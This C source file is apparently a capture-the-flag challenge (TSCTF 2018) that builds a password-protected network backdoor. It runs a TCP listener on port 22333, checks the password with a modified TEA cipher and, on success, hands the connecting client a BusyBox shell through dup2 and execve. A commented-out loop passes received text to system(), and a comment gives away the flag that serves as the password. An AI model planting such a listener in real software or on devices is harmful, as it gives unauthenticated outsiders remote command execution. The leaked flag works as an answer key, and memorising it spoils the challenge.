#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<errno.h>
#include<arpa/inet.h>

#define SERVER_PORT	22333

//加密函数  
void encrypt(uint32_t* v, uint32_t* k) {
	uint32_t v0 = v[0], v1 = v[1], sum = 0, i;           /* set up */
	uint32_t delta = 0xbac4d005;                     /* a key schedule constant change1 0x9e3779b9*/
	uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];   /* cache key */
	for (i = 0; i < 32; i++) {                       /* basic cycle start */
		sum += delta;
		v0 += ((v1 << 4) + k0 + 2) ^ (v1 + sum) ^ ((v1 >> 5) + k1 + 2);  //change2
		v1 += ((v0 << 4) + k2 + 3) ^ (v0 * 2 + sum) ^ ((v0 >> 5) + k3 + 3);  //change2
	}                                              /* end cycle */
	v[0] = v0; v[1] = v1;
}
//解密函数  
void decrypt(uint32_t* v, uint32_t* k) {
	uint32_t v0 = v[0], v1 = v[1], sum = 0x589a00a0, i;  /* set up */
	uint32_t delta = 0xbac4d005;                     /* a key schedule constant */
	uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];   /* cache key */
	for (i = 0; i < 32; i++) {                         /* basic cycle start */
		v1 -= ((v0 << 4) + k2 + 3) ^ (v0 * 2 + sum) ^ ((v0 >> 5) + k3 + 3);
		v0 -= ((v1 << 4) + k0 + 2) ^ (v1 + sum) ^ ((v1 >> 5) + k1 + 2);
		sum -= delta;
	}                                              /* end cycle */
	v[0] = v0; v[1] = v1;
}

void trans2Int(char *buf, int bufLen, uint32_t v[])
{
	for (int i = 0; i < bufLen / 8; i++)
	{
		v[i * 2 + 0] = (buf[i * 8 + 3] << 24) | (buf[i * 8 + 2] << 16) | (buf[i * 8 + 1] << 8) | (buf[i * 8 + 0]);
		v[i * 2 + 1] = (buf[i * 8 + 7] << 24) | (buf[i * 8 + 6] << 16) | (buf[i * 8 + 5] << 8) | (buf[i * 8 + 4]);
	}
}

void trans2str(uint32_t v[], char *buf,char *cmpStr)
{
	int i = 0;
	while (v[i])
	{
		buf[i * 4 + 0] = v[i] & 0xFF;
		buf[i * 4 + 1] = (v[i] >> 8) & 0xFF;
		buf[i * 4 + 2] = (v[i] >> 16) & 0xFF;
		buf[i * 4 + 3] = (v[i] >> 24) & 0xFF;
		i++;
	}
	i = 0;
	while (buf[i])
	{
		sprintf(cmpStr + i * 2, "%02X", buf[i] & 0xff);
		i++;
	}
}

int main(int argc,char *argv[])
{
	//char *shell[] = {"/bin/busybox","sh",(char *)0};
    //char *shell[3];
    char *shell[] = {"/bin/busybox","sh",(char *)0};
    int serfd,confd,server_pid;
    struct sockaddr_in server,client;
    char *cmpStr = (char *)malloc(64);
    int bufLen;
    socklen_t len;
    memset(cmpStr, '\x00', sizeof(cmpStr));
    uint32_t v[9] = {0,};
    uint32_t k[4] = { 0x6b636162,0x726f6f64,0x646f6f72,0x6261636b };    
    serfd = socket(AF_INET,SOCK_STREAM,0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(SERVER_PORT);

    bind(serfd,(struct sockaddr *)&server,sizeof(server));
    listen(serfd,1);

    printf("Waiting for the client msg!\n");

    while(1)
    {
       len = sizeof(struct sockaddr);
       confd = accept(serfd,(struct sockaddr *)&client,&len);
       server_pid = fork();
       if (server_pid)
       {
	       send(confd,"Now input your userName:",sizeof("Now input your userName:"),0);
	       //printf("Now input your userName:\n");
	       char *buf = malloc(1024);
	       int n = recv(confd,buf,1024,0);
	       //buf[n] = '\x00';
	       if (!strncmp(buf,"TSCTF2018\n",12))
	       {
	            memset(buf,'\x00',sizeof(buf));
	            send(confd,"Now input your passWord:",sizeof("Now input your passWord:"),0);
	            n = recv(confd,buf,1024,0);
	            buf[n-1] = '\x00';

	            //char buf[] = { "TSCTF{8aCKd00r_1n_tH3_DL1nk^-^!}" };
	            bufLen = strlen(buf);
	            if (bufLen > 32)
	            {
	                return 0;
	            }
	            trans2Int(buf, bufLen, v);
	            for (int i = 0; i < bufLen / 8; i++)
	            {
	                encrypt(&v[i*2], k);
	            }
	            trans2str(v, buf,cmpStr);
	            if (strcmp(cmpStr, "9C3981B381901AC5DA7CCB3461BA21C64888A60A98DB25671F218E9EDA9DC8C0") == 0 )
	            {
	            	send(confd,"Login Successfully!\n",sizeof("Login Successfully!\n"),0);
	                dup2(confd,0);
	                dup2(confd,1);
	                dup2(confd,2);
	                execve("/bin/busybox",shell,0);
	                close(confd);
	                //execve("/bin/busybox",shell,(char *)0);
	                //system("/bin/sh");
	                /*while(1)
	                {
	                    memset(buf,'\x00',sizeof(buf));
	                    recv(confd,buf,1024,0);
	                    if (!strcmp(buf,"quit")) break;
	                    system(buf);
	                }
	                */
	            }
	            else
	            {
	            	send(confd,"Login Failed\n",sizeof("Login Failed\n"),0);
	            	close(confd);
	            }
	       }
	       else
	       {
	       		send(confd,"Login Failed!\n",sizeof("Login Failed!\n"),0);
	            close(confd);
	       }
	   }
      //printf("recv msg from client:%s",buf);
       close(confd);
    }
    return 0;
}